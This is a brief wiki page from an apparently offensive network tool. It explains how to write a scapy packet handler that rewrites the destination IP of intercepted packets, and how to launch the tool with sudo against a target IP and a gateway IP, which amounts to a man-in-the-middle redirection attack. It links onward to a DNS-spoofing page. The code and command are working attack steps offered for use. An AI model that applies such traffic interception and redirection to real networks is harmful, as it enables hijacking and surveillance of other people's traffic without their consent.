# [wiki]::Custom handlers
<ol>
  <li>Write your packet handler function test.py<br>
  <code>from scapy.all import *
def my_handler(packet):
    old_dst = packet[IP].dst
    packet[IP].dst = "192.168.1.113"
    print("[HANDLER] modified from", old_dst, "to", packet[IP].dst)
    return packet</code></li>
  <li>Discover your target's ip and gateway ip: you can use <a href="https://github.com/n0nexist/subdisc">subdisc</a> for this task.</li>
  <li>Run: <code>sudo python3 main.py [target ip] [gateway ip] custom test.my_handler</code></li>
  <li>The sniffed packets will now be modified by the function my_handler from the file test.py</li>
</ol>

# Screenshots
![screenshot](https://user-images.githubusercontent.com/111337838/227001598-4e395cd5-3a4e-4fa1-bff7-23dda29ed799.png)

#
<h3>Next wiki page: <a href="https://github.com/n0nexist/Trafficante/blob/main/wiki/dns-spoofing.md">dns spoofing</a></h3>
